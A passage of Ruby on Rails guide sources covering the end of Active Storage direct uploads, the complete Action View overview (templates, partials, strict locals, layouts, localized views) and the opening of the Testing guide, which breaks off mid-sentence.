  const element = document.getElementById(`direct-upload-${id}`)
  element.classList.add("direct-upload--complete")
})
```

Add CSS to style the progress of the uploaded files:

```css
/* app/assets/stylesheets/direct_uploads.css */
.direct-upload {
  display: inline-block;
  position: relative;
  padding: 2px 4px;
  margin: 0 3px 3px 0;
  border: 1px solid rgba(0, 0, 0, 0.3);
  border-radius: 3px;
  font-size: 11px;
  line-height: 13px;
}

.direct-upload--pending {
  opacity: 0.6;
}

.direct-upload__progress {
  position: absolute;
  top: 0;
  left: 0;
  bottom: 0;
  opacity: 0.2;
  background: #0076ff;
  transition: width 120ms ease-out, opacity 60ms 60ms ease-in;
  transform: translate3d(0, 0, 0);
}

.direct-upload--complete .direct-upload__progress {
  opacity: 0.4;
}

.direct-upload--error {
  border-color: red;
}

input[type=file][data-direct-upload-url][disabled] {
  display: none;
}
```

### Custom Drag and Drop Solutions

You can use the `DirectUpload` class for this purpose as well. Upon receiving a
file from your library of choice, instantiate a DirectUpload and call its create
method. Create takes a callback to invoke when the upload completes.

```js
// app/javascript/drag_and_drop_uploads.js
import { DirectUpload } from "@rails/activestorage"

const input = document.querySelector('input[type=file]')

// Bind to file drop - use the ondrop on a parent element or use a
//  library like Dropzone
const onDrop = (event) => {
  event.preventDefault()
  const files = event.dataTransfer.files;
  Array.from(files).forEach(file => uploadFile(file))
}

// Bind to normal file selection
input.addEventListener('change', (event) => {
  Array.from(input.files).forEach(file => uploadFile(file))
  // you might clear the selected files from the input
  input.value = null
})

const uploadFile = (file) => {
  // your form needs the file_field direct_upload: true, which
  //  provides data-direct-upload-url
  const url = input.dataset.directUploadUrl
  const upload = new DirectUpload(file, url)

  upload.create((error, blob) => {
    if (error) {
      // Handle the error
    } else {
      // Add an appropriately-named hidden input to the form with a
      //  value of blob.signed_id so that the blob ids will be
      //  transmitted in the normal upload flow
      const hiddenField = document.createElement('input')
      hiddenField.setAttribute("type", "hidden");
      hiddenField.setAttribute("value", blob.signed_id);
      hiddenField.name = input.name
      document.querySelector('form').appendChild(hiddenField)
    }
  })
}
```

### Track the Progress of the File Upload

When using the `DirectUpload` constructor, it is possible to include a third
parameter. This will allow the `DirectUpload` object to invoke the
`directUploadWillStoreFileWithXHR` method during the upload process. You can
then attach your own progress handler to the XHR to suit your needs.

```js
import { DirectUpload } from "@rails/activestorage"

class Uploader {
  constructor(file, url) {
    this.upload = new DirectUpload(file, url, this)
  }

  uploadFile(file) {
    this.upload.create((error, blob) => {
      if (error) {
        // Handle the error
      } else {
        // Add an appropriately-named hidden input to the form
        // with a value of blob.signed_id
      }
    })
  }

  directUploadWillStoreFileWithXHR(request) {
    request.upload.addEventListener("progress",
      event => this.directUploadDidProgress(event))
  }

  directUploadDidProgress(event) {
    // Use event.loaded and event.total to update the progress bar
  }
}
```

### Integrating with Libraries or Frameworks

Once you receive a file from the library you have selected, you need to create a
`DirectUpload` instance and use its `create` method to initiate the upload
process, adding any required additional headers as necessary. The "create"
method also requires a callback function to be provided that will be triggered
once the upload has finished.

```js
import { DirectUpload } from "@rails/activestorage"

class Uploader {
  constructor(file, url, token) {
    const headers = { 'Authentication': `Bearer ${token}` }
    // INFO: Sending headers is an optional parameter. If you choose not to send headers,
    //       authentication will be performed using cookies or session data.
    this.upload = new DirectUpload(file, url, this, headers)
  }

  uploadFile(file) {
    this.upload.create((error, blob) => {
      if (error) {
        // Handle the error
      } else {
        // Use the with blob.signed_id as a file reference in next request
      }
    })
  }

  directUploadWillStoreFileWithXHR(request) {
    request.upload.addEventListener("progress",
      event => this.directUploadDidProgress(event))
  }

  directUploadDidProgress(event) {
    // Use event.loaded and event.total to update the progress bar
  }
}
```

To implement customized authentication, a new controller must be created on the
Rails application, similar to the following:

```ruby
class DirectUploadsController < ActiveStorage::DirectUploadsController
  skip_forgery_protection
  before_action :authenticate!

  def authenticate!
    @token = request.headers["Authorization"]&.split&.last

    head :unauthorized unless valid_token?(@token)
  end
end
```

NOTE: Using [Direct Uploads](#direct-uploads) can sometimes result in a file
that uploads, but never attaches to a record. Consider [purging unattached
uploads](#purging-unattached-uploads-and-detach).

Testing
-------

There is a
[`file_fixture_upload`](https://api.rubyonrails.org/classes/ActionDispatch/TestProcess/FixtureFile.html#method-i-file_fixture_upload)
helper method to test uploading a file in an integration or controller test.
Please see the [Testing guide](testing.html#testing-active-storage) for details.


<!-- ===== guides/source/action_view_overview.md ===== -->

**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON <https://guides.rubyonrails.org>.**

Action View Overview
====================

After reading this guide, you will know:

* What Action View is and how to use it with Rails.
* How best to use templates, partials, and layouts.
* How to use localized views.

--------------------------------------------------------------------------------

What is Action View?
--------------------

Action View is the V in
[MVC](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller).
[Action Controller](action_controller_overview.html) and Action View work
together to handle web requests. Action Controller is concerned with
communicating with the model layer (of MVC) and retrieving data. Action View is
then responsible for rendering a response body to the web request using that
data.

By default, Action View templates (also referred to simply as "views") are
written using Embedded Ruby (ERB), which allows using Ruby code within HTML
documents.

Action View provides many [helper](#helpers) methods for dynamically generating
HTML tags for forms, dates, and strings. It's also possible to add custom
helpers to your application as needed.

NOTE: Action View can make use of Active Model features like
[`to_param`](https://api.rubyonrails.org/classes/ActiveModel/Conversion.html#method-i-to_param)
and
[`to_partial_path`](https://api.rubyonrails.org/classes/ActiveModel/Conversion.html#method-i-to_partial_path)
to simplify code. That doesn't mean Action View depends on Active Model. Action
View is an independent package that can be used with any Ruby library.

Using Action View with Rails
----------------------------

Action View templates (aka "views") are stored in subdirectories in the
`app/views` directory. There is a subdirectory matching the name of each
controller. The view files inside that subdirectory are used to render specific
views as a response to controller actions.

For example, when you use scaffolding to generate an `article` resource, Rails
generates the following files in `app/views/articles`:

```bash
$ bin/rails generate scaffold article
      [...]
      invoke  scaffold_controller
      create    app/controllers/articles_controller.rb
      invoke    erb
      create      app/views/articles
      create      app/views/articles/index.html.erb
      create      app/views/articles/edit.html.erb
      create      app/views/articles/show.html.erb
      create      app/views/articles/new.html.erb
      create      app/views/articles/_form.html.erb
      [...]
```

The file names follow a Rails naming convention. They share their name with the
associated controller action. For example the `index.html.erb`, `edit.html.erb`,
etc.

By following this naming convention, Rails will automatically find and render
the matching view at the end of a controller action, without you having to
specify it. For example, the `index` action in the `articles_controller.rb` will
automatically render the `index.html.erb` view inside the `app/views/articles/`
directory. The name and the location of the file are both important.

The final HTML returned to the client is composed of a combination of the
`.html.erb` ERB file, a layout template that wraps it, and all the partials that
the ERB file may reference. In the rest of this guide, you will find more
details about each of the three components: `Templates`, `Partials`, `Layouts`.

Templates
---------

Action View templates can be written in different formats. Rails uses the file
extension to determine the view's format and templating system.

For example, a file with a `.html.erb` extension uses ERB to build an
HTML response. [Jbuilder](https://github.com/rails/jbuilder) templates
that generate JSON will have the extension `.json.jbuilder`. And an XML
template using [`Builder`](https://github.com/rails/builder) would
use `.xml.builder`.

Other libraries may add more templating engines and formats.

### ERB

An ERB template is a way to sprinkle Ruby code within static HTML using special
ERB tags like `<% %>` and `<%= %>`.

When Rails processes the ERB view templates ending with `.html.erb`, it
evaluates the embedded Ruby code and replaces the ERB tags with the dynamic
output. That dynamic content is combined with the static HTML markup to form the
final HTML response.

Within an ERB template, Ruby code can be included using both `<% %>` and `<%=
%>` tags. The `<% %>` tag (without the `=`) is used when you want to execute
Ruby code but not directly output the result, such as conditions or loops. The
tag `<%= %>` is used for Ruby code that generates an output and you want that
output rendered within the template, such as a model attribute like
`person.name` in this example:

```html+erb
<h1>Names</h1>
<% @people.each do |person| %>
  Name: <%= person.name %><br>
<% end %>
```

The loop is set up using regular embedding tags (`<% %>`) and the name is
inserted using the output embedding tags (`<%= %>`).

Note that functions such as `print` and `puts` won't be rendered to the view
with ERB templates. So something like this would not work:

```html+erb
<%# WRONG %>
Hi, Mr. <% puts "Frodo" %>
```

The above example shows that comments can be added in ERB within `<%# %>` tag.

To suppress leading and trailing whitespaces, you can use `<%-` `-%>`
interchangeably with `<%` and `%>`.

### Jbuilder

`Jbuilder` is a gem that's maintained by the Rails team and included in the
default Rails `Gemfile`. It is used to build JSON responses using templates.

If you don't have it, you can add the following to your `Gemfile`:

```ruby
gem "jbuilder"
```

A `Jbuilder` object named `json` is automatically made available to templates
with a `.jbuilder` extension.

Here is a basic example:

```ruby
json.name("Alex")
json.email("alex@example.com")
```

would produce:

```json
{
  "name": "Alex",
  "email": "alex@example.com"
}
```

See the [Jbuilder documentation](https://github.com/rails/jbuilder#jbuilder) for
more examples.

### Builder

Builder templates are a more programmatic alternative to ERB. It's similar to
`JBuilder` but is used to generate XML, instead of JSON.

An `XmlMarkup` object named `xml` is automatically made available to templates
with a `.builder` extension.

Here is a basic example:

```ruby
xml.em("emphasized")
xml.em { xml.b("emph & bold") }
xml.a("A Link", "href" => "https://rubyonrails.org")
xml.target("name" => "compile", "option" => "fast")
```

which would produce:

```html
<em>emphasized</em>
<em><b>emph &amp; bold</b></em>
<a href="https://rubyonrails.org">A link</a>
<target option="fast" name="compile" />
```

Any method with a block will be treated as an XML markup tag with nested markup
in the block. For example, the following:

```ruby
xml.div {
  xml.h1(@person.name)
  xml.p(@person.bio)
}
```

would produce something like:

```html
<div>
  <h1>David Heinemeier Hansson</h1>
  <p>A product of Danish Design during the Winter of '79...</p>
</div>
```

See [Builder documentation](https://github.com/rails/builder) for more examples.

### Template Compilation

By default, Rails will compile each template to a method to render it. In the
development environment, when you alter a template, Rails will check the file's
modification time and recompile it.

There is also Fragment Caching for when different parts of the page need to be
cached and expired separately. Learn more about it in the [caching
guide](caching_with_rails.html#fragment-caching).

Partials
--------

Partial templates - usually just called "partials" - are a way of breaking up
the view templates into smaller reusable chunks. With partials, you can extract
a piece of code from your main template to a separate smaller file, and render
that file in the main template. You can also pass data to the partial files from
the main template.

Let's see this in action with some examples:

### Rendering Partials

To render a partial as part of a view, you use the
[`render`](https://api.rubyonrails.org/classes/ActionView/Helpers/RenderingHelper.html#method-i-render)
method within the view:

```erb
<%= render "product" %>
```

This will look for a file named `_product.html.erb` in the same folder to render
within that view. If no such file exists, Rails will look for it under the
`app/view/application/` folder. This makes `app/views/application/` a great
place for your shared partials.

NOTE: Rails doesn't automatically create `app/views/application/`. You'll
need to create this folder yourself.

NOTE: Refer to the
[Layouts and Rendering guide](layouts_and_rendering.html#template_lookup_hierarchy)
for further information on the lookup hierarchy of partials and template.

Partial file names start with leading underscore character by
convention. The file name distinguishes partials from regular views. However, no
underscore is used when referring to partials for rendering within a view. This
is true even when you reference a partial from another directory:

```erb
<%= render "admin/control_panel" %>
```

That code will look for and render a partial named `_control_panel.html.erb` in
`app/views/admin/`.

### Using Partials to Simplify Views

One way to use partials is to treat them as the equivalent of methods. A way to
move details out of a view so that you can grasp what's going on more easily.
For example, you might have a view that looks like this:

```html+erb
<%= render "application/ad_banner" %>

<h1>Products</h1>

<p>Here are a few of our fine products:</p>
<% @products.each do |product| %>
  <%= render partial: "product", locals: { product: product } %>
<% end %>

<%= render "application/footer" %>
```

Here, the `_ad_banner.html.erb` and `_footer.html.erb` partials could contain
content that is shared among many pages in your application. You don't need to
see the details of these sections when you're focused on a Products' page.

The above example also uses the `_product.html.erb` partial. This partial
contains details for rendering an individual product and is used to render each
product in the collection `@products`.

### Passing Data to Partials with `locals` Option

When rendering a partial, you can pass data to the partial from the rendering
view. You use the `locals:` options hash for this. Each key in the `locals:`
option is available as a partial-local variable:

```html+erb
<%# app/views/products/show.html.erb %>

<%= render partial: "product", locals: { my_product: @product } %>

<%# app/views/products/_product.html.erb %>

<%= tag.div id: dom_id(my_product) do %>
  <h1><%= my_product.name %></h1>
<% end %>
```

A "partial-local variable" is a variable that is local to a given partial and
only available from within that partial. In the above example, `my_product` is a
partial-local variable. It was assigned the value of `@product` when passed to
the partial from the original view.

Note that typically we'd simply call this local variable `product`. We are using
`my_product` to distinguish it from the instance variable name and template name
in this example.

Since `locals` is a hash, you can pass in multiple variables as needed, like
`locals: { my_product: @product, my_reviews: @reviews }`.

However, if a template refers to a variable that *isn't* passed into the view as
part of the `locals:` option, the template will raise an
`ActionView::Template::Error`:

```html+erb
<%# app/views/products/_product.html.erb %>

<%= tag.div id: dom_id(my_product) do %>
  <h1><%= my_product.name %></h1>

  <%# => raises ActionView::Template::Error for `product_reviews` %>
  <% product_reviews.each do |review| %>
    <%# ... %>
  <% end %>
<% end %>
```

### Using `local_assigns`

Each partial has a method called [local_assigns][] available. You can use this
method to access keys passed via the `locals:` option. If a partial was not
rendered with `:some_key` set, the value of `local_assigns[:some_key]` will be
`nil` within the partial.

For example, `product_reviews` is `nil` in the below example since only
`product` is set in `locals:`:

```html+erb
<%# app/views/products/show.html.erb %>

<%= render partial: "product", locals: { product: @product } %>

<%# app/views/products/_product.html.erb %>

<% local_assigns[:product]          # => "#<Product:0x0000000109ec5d10>" %>
<% local_assigns[:product_reviews]  # => nil %>
```

One use case for `local_assigns` is optionally passing in a local variable and
then conditionally performing an action in the partial based on whether the
local variable is set. For example:

```html+erb
<% if local_assigns[:redirect] %>
  <%= form.hidden_field :redirect, value: true %>
<% end %>
```

Another example from Active Storage's `_blob.html.erb`. This one sets the size
based on whether `in_gallery` local variable is set when rendering the partial
that contains this line:

```html+erb
<%= image_tag blob.representation(resize_to_limit: local_assigns[:in_gallery] ? [ 800, 600 ] : [ 1024, 768 ]) %>
```

### `render` without `partial` and `locals` Options

In the above examples, `render` takes 2 options: `partial` and `locals`. But if
these are the only options you need to use, you can skip the keys, `partial` and
`locals`, and specify the values only.

For example, instead of:

```erb
<%= render partial: "product", locals: { product: @product } %>
```

You can write:

```erb
<%= render "product", product: @product %>
```

You can also use this shorthand based on conventions:

```erb
<%= render @product %>
```

This will look for a partial named `_product.html.erb` in `app/views/products/`,
as well as pass a local named `product` set to the value `@product`.

NOTE: Under the hood, Rails calls `to_partial_path` on the model to determine
which partial to render. You can override this method to customize the
partial if required.

### The `as` and `object` Options

By default, objects passed to the template are in a local variable with the same
name as the template. So, given:

```erb
<%= render @product %>
```

within the `_product.html.erb` partial you'll get `@product` instance variable
in the local variable `product`, as if you had written:

```erb
<%= render partial: "product", locals: { product: @product } %>
```

The `object` option can be used to specify a different name. This is useful when
the template's object is elsewhere (e.g. in a different instance variable or in
a local variable).

For example, instead of:

```erb
<%= render partial: "product", locals: { product: @item } %>
```

you can write:

```erb
<%= render partial: "product", object: @item %>
```

This assigns the instance variable `@item` to a partial local variable named
`product`. What if you wanted to change the local variable name from the default
`product` to something else? You can use the `:as` option for that.

With the `as` option, you can specify a different name for the local variable
like this:

```erb
<%= render partial: "product", object: @item, as: "item" %>
```

This is equivalent to

```erb
<%= render partial: "product", locals: { item: @item } %>
```

### Rendering Collections

It's common for a view to iterate over a collection, such as `@products`, and
render a partial template for each object in the collection. This pattern has
been implemented as a single method that accepts an array and renders a partial
for each one of the elements in the array.

For example, to render all products:

```erb
<% @products.each do |product| %>
  <%= render partial: "product", locals: { product: product } %>
<% end %>
```

can be rewritten in a single line:

```erb
<%= render partial: "product", collection: @products %>
```

When a partial is called with a collection, the individual instances of the
partial have access to the member of the collection being rendered via a
variable named after the partial. In this case, since the partial is
`_product.html.erb`, you can use `product` to refer to the collection member
that is being rendered.

When the collection you wish to render contains objects that respond
to `to_partial_path`, such as Active Record and Active Model instances,
you can use the following shorthand:

```html+erb
<%= render @products %>
```

Rails determines the partial for each object by calling `to_partial_path` on it.
Conventionally, for Active Record objects, this is the name of the model:
`products/_product.html.erb` for `Product`.

A collection can be composed of different types of objects and Rails will render
the corresponding partial for each one.

```html+erb
<%# customers/_customer.html.erb -%>
<p>Customer: <%= customer.name %></p>

<%# employees/_employee.html.erb -%>
<p>Employee: <%= employee.name %></p>
```

```
<%# index.html.erb -%>
<h1>Contacts</h1>

<%# Rails will render the matching partial for customer and employee objects -%>
<%= render [customer1, employee1, customer2, employee2] %>
```

If the collection is empty, `render` will return nil so you can define a fallback.

```html+erb
<h1>Products</h1>
<%= render(@products) || "There are no products available." %>
```

### Spacer Templates

You can also specify a second partial to be rendered between instances of the
main partial by using the `:spacer_template` option:

```erb
<%= render partial: @products, spacer_template: "product_ruler" %>
```

Rails will render the `_product_ruler.html.erb` partial (with no data passed to
it) between each pair of `_product.html.erb` partials.

### Iteration Variables

Rails injects two additional variables into each partial when rendering
a collection: `<object>_counter` and `<object>_iteration`.

```html+erb
<%# app/views/products/index.html.erb -%>
<%= render @products %>

<%# app/views/products/_product.html.erb -%>
<ul>
  <li>Counter: <%= product_counter %></li>
  <li>Iteration: <%= product_iteration %></li>
</ul>
```

The `product_counter` is the index of the element being rendered within the collection.
The `product_iteration` is an instance of
[`ActionView::PartialIteration`](https://api.rubyonrails.org/classes/ActionView/PartialIteration.html)
which can be used to determine if it's the first or last element in
the collection.

When using the `as:` option, these variable names will also change.
For example, using `as: :item` will create variables
called `item_counter` and `item_iteration`.

NOTE: The following two sections, [Strict Locals](#strict-locals) and [Local
Assigns with Pattern Matching](#local-assigns-with-pattern-matching) are more
advanced features of using partials, included here for completeness.

### `local_assigns` with Pattern Matching

Since `local_assigns` is a `Hash`, it's compatible with [Ruby 3.1's pattern
matching assignment
operator](https://docs.ruby-lang.org/en/master/syntax/pattern_matching_rdoc.html):

```ruby
local_assigns => { product:, **options }
product # => "#<Product:0x0000000109ec5d10>"
options # => {}
```

When keys other than `:product` are assigned into a partial-local `Hash`
variable, they can be splatted into helper method calls:

```html+erb
<%# app/views/products/_product.html.erb %>

<% local_assigns => { product:, **options } %>

<%= tag.div id: dom_id(product), **options do %>
  <h1><%= product.name %></h1>
<% end %>

<%# app/views/products/show.html.erb %>

<%= render "products/product", product: @product, class: "card" %>
<%# => <div id="product_1" class="card">
  #      <h1>A widget</h1>
  #    </div>
%>
```

Pattern matching assignment also supports variable renaming:

```ruby
local_assigns => { product: record }
product             # => "#<Product:0x0000000109ec5d10>"
record              # => "#<Product:0x0000000109ec5d10>"
product == record   # => true
```

You can also conditionally read a variable, then fall back to a default value
when the key isn't part of the `locals:` options, using `fetch`:

```html+erb
<%# app/views/products/_product.html.erb %>

<% local_assigns.fetch(:related_products, []).each do |related_product| %>
  <%# ... %>
<% end %>
```

Combining Ruby 3.1's pattern matching assignment with calls to
[Hash#with_defaults](https://api.rubyonrails.org/classes/Hash.html#method-i-with_defaults)
enables compact partial-local default variable assignments:

```html+erb
<%# app/views/products/_product.html.erb %>

<% local_assigns.with_defaults(related_products: []) => { product:, related_products: } %>

<%= tag.div id: dom_id(product) do %>
  <h1><%= product.name %></h1>

  <% related_products.each do |related_product| %>
    <%# ... %>
  <% end %>
<% end %>
```

[local_assigns]:
    https://api.rubyonrails.org/classes/ActionView/Template.html#method-i-local_assigns

### Strict Locals

Action View partials are compiled into regular Ruby methods under the hood.
Because it is impossible in Ruby to dynamically create local variables,
every single combination of `locals` passed to a partial requires
compiling another version:

```html+erb
<%# app/views/articles/show.html.erb %>

<%= render partial: "article", layout: "box", locals: { article: @article } %>
<%= render partial: "article", layout: "box", locals: { article: @article, theme: "dark" } %>
```

The above snippet will cause the partial to be compiled twice, taking more time and using more memory.

```ruby
def _render_template_2323231_article_show(buffer, local_assigns, article:)
  # ...
end

def _render_template_3243454_article_show(buffer, local_assigns, article:, theme:)
  # ...
end
```

When the number of combinations is small, it's not really a problem, but if it's large it can waste
a sizeable amount of memory and take a long time to compile. To counteract this you can use
strict locals to define the compiled partial signature, and ensure only a single version of the partial is compiled:

```html+erb
<%# locals: (article:, theme: "light") -%>
...
```

You can enforce how many and which `locals` a template accepts, set default
values, and more with a `locals:` signature, using the same syntax as Ruby method signatures.

Here are some examples of the `locals:` signature:

```html+erb
<%# app/views/messages/_message.html.erb %>

<%# locals: (message:) -%>
<%= message %>
```

The above makes `message` a required local variable. Rendering the partial
without a `:message` local variable argument will raise an exception:

```ruby
render "messages/message"
# => ActionView::Template::Error: missing local: :message for app/views/messages/_message.html.erb
```

If a default value is set then it can be used if `message` is not passed in
`locals:`:

```erb
<%# app/views/messages/_message.html.erb %>

<%# locals: (message: "Hello, world!") -%>
<%= message %>
```

Rendering the partial without a `:message` local variable uses the default value
set in the `locals:` signature:

```ruby
render "messages/message"
# => "Hello, world!"
```

Rendering the partial with local variables not specified in the `local:` signature will also raise an exception:

```ruby
render "messages/message", unknown_local: "will raise"
# => ActionView::Template::Error: unknown local: :unknown_local for app/views/messages/_message.html.erb
```

You can allow optional local variable arguments with the double splat `**`
operator:

```erb
<%# app/views/messages/_message.html.erb %>

<%# locals: (message: "Hello, world!", **attributes) -%>
<%= tag.p(message, **attributes) %>
```

Or you can disable `locals` entirely by setting the `locals:` to empty `()`:

```erb
<%# app/views/messages/_message.html.erb %>

<%# locals: () %>
```

Rendering the partial with *any* local variable arguments will raise an
exception:

```ruby
render "messages/message", unknown_local: "will raise"
# => ActionView::Template::Error: no locals accepted for app/views/messages/_message.html.erb
```

WARNING: When using strict locals with collection rendering, you need to
explicity allow the `<object>_counter` and `<object>_iteration` variables or
they will not be set: `<%# locals: (product_counter: nil, product_iteration: nil)`.
The `nil` default values are needed so the partial doesn't break
when rendered outside of collections, where these two variables will
not be set.

Action View will process the `locals:` signature in any templating engine
that supports `#`-prefixed comments, and will read the signature from any
line in the partial.

CAUTION: Only keyword arguments are supported. Defining positional or block
arguments will raise an Action View Error at render-time.

The `local_assigns` method does not contain default values specified in the
`local:` signature. To access a local variable with a default value that
is named the same as a reserved Ruby keyword, like `class` or `if`, the values
can be accessed through `binding.local_variable_get`:

```erb
<%# locals: (class: "message") %>
<div class="<%= binding.local_variable_get(:class) %>">...</div>
```

Layouts
-------

Layouts can be used to render a common view template around the results of Rails
controller actions. A Rails application can have multiple layouts that pages can
be rendered within.

For example, an application might have one layout for a logged in user and
another for the marketing part of the site. The logged in user layout might
include top-level navigation that should be present across many controller
actions. The sales layout for a SaaS app might include top-level navigation for
things like "Pricing" and "Contact Us" pages. Different layouts can have a
different header and footer content.

To find the layout for the current controller action, Rails first looks for a
file in `app/views/layouts` with the same base name as the controller. For
example, rendering actions from the `ProductsController` class will use
`app/views/layouts/products.html.erb`.

Rails will use `app/views/layouts/application.html.erb` if a controller-specific layout does not exist.

Here is an example of a basic layout in `application.html.erb` file:

```html+erb
<!DOCTYPE html>
<html>
<head>
  <title><%= "Your Rails App" %></title>
  <%= csrf_meta_tags %>
  <%= csp_meta_tag %>
  <%= stylesheet_link_tag "application", "data-turbo-track": "reload" %>
  <%= javascript_importmap_tags %>
</head>
<body>

<nav>
  <ul>
    <li><%= link_to "Home", root_path %></li>
    <li><%= link_to "Products", products_path %></li>
    <%# Additional navigation links here %>
  </ul>
</nav>

<%= yield %>

<footer>
  <p>&copy; <%= Date.current.year %> Your Company</p>
</footer>
```

In the above example layout, view content will be rendered in place of `<%=
yield %>`, and surrounded by the same `<head>`, `<nav>`, and `<footer>` content.

To learn more about controller-specific layouts, see the [Layouts and
Rendering in Rails](layouts_and_rendering.html#setting_layouts_in_controllers)
guide.

### Structuring Layouts

Layouts can provide one or more slots into which views can render content.
They can also incorporate partials just like regular views to offer
better structure.

Slots can be defined using `yield` and [`content_for`][].

[`content_for`]: https://api.rubyonrails.org/classes/ActionView/Helpers/CaptureHelper.html#method-i-content_for

#### Understanding `yield`

Within a layout, `yield` provides the slot where content from the view
should be inserted.

```html+erb
<html>
  <head>
  </head>
  <body>
    <%= yield %>
  </body>
</html>
```

You can also create a layout with multiple yielding regions:

```html+erb
<html>
  <head>
    <%= yield :head %>
  </head>
  <body>
    <%= yield %>
  </body>
</html>
```

The main body of the view will always render into the unnamed `yield`. To
render content into a named `yield`, call `content_for` with the same
argument as the named `yield`.

#### Slotting Content with `content_for`

The [`content_for`][] method allows you to insert content into a named
`yield` block in your layout. For example, consider the following layout
and view:

```html+erb
<html>
  <head>
    <title>The page title</title>
  </head>
  <body>
    <header>
      <%= yield :header %>
    </header>

    <main>
      <%= yield %>
    </main>
  </body>
</html>
```

```html+erb
<% content_for :header do %>
  <h1>A simple page</h1>
<% end %>

<p>Hello, Rails!</p>
```

This will render out:

```html
<html>
  <head>
    <title>The page title</title>
  </head>
  <body>
    <header>
      <h1>A simple page</h1>
    </header>
    <main>
      <p>Hello, Rails!</p>
    </main>
  </body>
</html>
```

You can also use `content_for` in the layout instead of `yield`, along
with an optional check to inquire whether content for that particular
slot was provided:

```html+erb
<html>
  <head>
    <title>The page title</title>
  </head>
  <body>
    <header>
      <%= content_for :header if content_for?(:header) %>
    </header>

    <main>
      <%= yield %>
    </main>
  </body>
</html>
```

This example is functionally equivalent to the previous one where we
used `yield :head`.

TIP: The `content_for` method is very helpful when your layout contains
distinct regions such as sidebars and footers that should get their own
blocks of content inserted. It's also useful for inserting page-specific
JavaScript and CSS, context-specific `<meta>` elements, or any other elements
into an otherwise generic layout.

#### Nested Layouts

Layouts can inherit from other layouts when you need to make minor changes
for certain controllers. Let's say your application has an _admin_ area
which displays an extra _admin panel_ but the rest of the layout is
the same.

Instead of duplicating your `application.html.erb` layout with the
addition of the admin panel, you can create an `admin.html.erb` layout
which inherits from `application.html.erb`.

```html+erb
<%# app/views/layouts/application.html.erb -%>

<html>
  <%# ... -%>
  <body>
    <header>
      <nav>Navigation menu items here</nav>
    </header>

    <main>
      <% if content_for(:main) -%>
        <%= yield :content %>
      <% else %>
        <%= yield %>
      <% end %>
    </main>
  </body>
</html>
```

```html+erb
<%# app/views/layouts/admin.html.erb -%>

<% content_for :main do %>
  <aside>Admin panel goes here</aside>

  <%= yield %>
<% end %>

<%= render template: "layouts/application" %>
```

You can then set all the controllers serving the _admin area_ of the
application to layout using `admin.html.erb`, and your view code remains DRY.

### Partial Layouts

Partials can have their own layouts applied to them. These layouts are different
from those applied to a controller action, but they work in a similar fashion.

Let's say you're displaying an article on a page which should be wrapped in a
`div` for display purposes. First, you'll create a new `Article`:

```ruby
Article.create(body: "Partial Layouts are cool!")
```

In the `show` template, you'll render the `_article` partial wrapped in the
`box` layout:

```html+erb
<%# app/views/articles/show.html.erb %>
<%= render partial: 'article', layout: 'box', locals: { article: @article } %>
```

The `box` layout simply wraps the `_article` partial in a `div`:

```html+erb
<%# app/views/articles/_box.html.erb %>
<div class="box">
  <%= yield %>
</div>
```

Note that the partial layout has access to the local `article` variable that was
passed into the `render` call, although it is not being used within
`_box.html.erb` in this case.

Unlike application-wide layouts, partial layouts still have the underscore
prefix in their name.

You can also render a block of code within a partial layout instead of calling
`yield`. For example, if you didn't have the `_article` partial, you could do
this instead:

```html+erb
<%# app/views/articles/show.html.erb %>
<%= render(layout: 'box', locals: { article: @article }) do %>
  <div>
    <p><%= article.body %></p>
  </div>
<% end %>
```

Assuming you use the same `_box` partial from above, this would produce the same
output as the previous example.

### Collection with Partial Layouts

When rendering collections it is also possible to use the `:layout` option:

```erb
<%= render partial: "article", collection: @articles, layout: "special_layout" %>
```

The layout will be rendered together with the partial for each item in the
collection. The current object and object_counter variables, `article` and
`article_counter` in the above example, will be available in the layout as well,
the same way they are within the partial.

Helpers
-------

Rails provides many helper methods to use with Action View. These include
methods for:

* Formatting dates, strings and numbers
* Creating HTML links to images, videos, stylesheets, etc...
* Sanitizing content
* Creating forms
* Localizing content

You can learn more about helpers in the [Action View Helpers
Guide](action_view_helpers.html) and the [Action View Form Helpers
Guide](form_helpers.html).

Localized Views
---------------

Action View has the ability to render different templates depending on the
current locale.

For example, suppose you have an `ArticlesController` with a `show` action. By
default, calling this action will render `app/views/articles/show.html.erb`. But
if you set `I18n.locale = :de`, then Action View will try to render the template
`app/views/articles/show.de.html.erb` first. If the localized template isn't
present, the undecorated version will be used. This means you're not required to
provide localized views for all cases, but they will be preferred and used if
available.

You can use the same technique to localize the rescue files in your public
directory. For example, setting `I18n.locale = :de` and creating
`public/500.de.html` and `public/404.de.html` would allow you to have localized
rescue pages.

See the [Internationalization (I18n)](i18n.html) guide for more details.


<!-- ===== guides/source/testing.md ===== -->

**DO NOT READ THIS FILE ON GITHUB, GUIDES ARE PUBLISHED ON <https://guides.rubyonrails.org>.**

Testing Rails Applications
==========================

This guide explores how to write tests in Rails.

After reading this guide, you will know:

* Rails testing terminology.
* How to write unit, functional, integration, and system tests for your
  application.
* Other popular testing approaches and plugins.

--------------------------------------------------------------------------------

Why Write Tests?
----------------

Writing automated tests can be a faster way of ensuring your code continues to
work as expected than manual testing through the browser or the console. Failing
tests can quickly reveal issues, allowing you to identify and fix bugs early in
the development process. This practice not only improves the reliability of your
code but also improves confidence in your changes.

Rails makes it easy to write tests. You can read more about Rails' built in
support for testing in the next section.

Introduction to Testing
-----------------------

With Rails, testing is central to the development process right from the
creation of a new application.

### Test Setup

Rails creates a `test` directory for you as soon as you create a Rails project
using `bin/rails new` _application_name_. If you list the contents of this directory
then you will see:

```bash
$ ls -F test
controllers/  fixtures/  helpers/  integration/  mailers/  models/  test_helper.rb
```

### Test Directories

The `helpers`, `mailers`, and `models` directories store tests for [view
helpers](#testing-view-helpers), [mailers](#testing-mailers), and
[models](#testing-models), respectively.

The `controllers` directory is used for
[tests related to controllers](#functional-testing-for-controllers), routes, and
views, where HTTP requests will be simulated and assertions made on the
outcomes.

The `integration` directory is reserved for [tests that cover
interactions between controllers](#integration-testing).

[Fixtures](https://api.rubyonrails.org/classes/ActiveRecord/FixtureSet.html)
are a way of mocking up data to use in your tests, so that you don't have to use
'real' data. They are stored in the `fixtures` directory, and you can read more
about them in the [Fixtures](#fixtures) section below.

The `test_helper.rb` file holds the default configuration for your tests.

When you first [generate system tests](#generating-system-tests), a `system`
directory and an `application_system_test_case.rb` file will be created.

The `system` directory holds [system tests](#system-testing), which are
used for full browser testing of your application. System tests allow you to
test your application the way your users experience it and help you test your
JavaScript as well. System tests inherit from
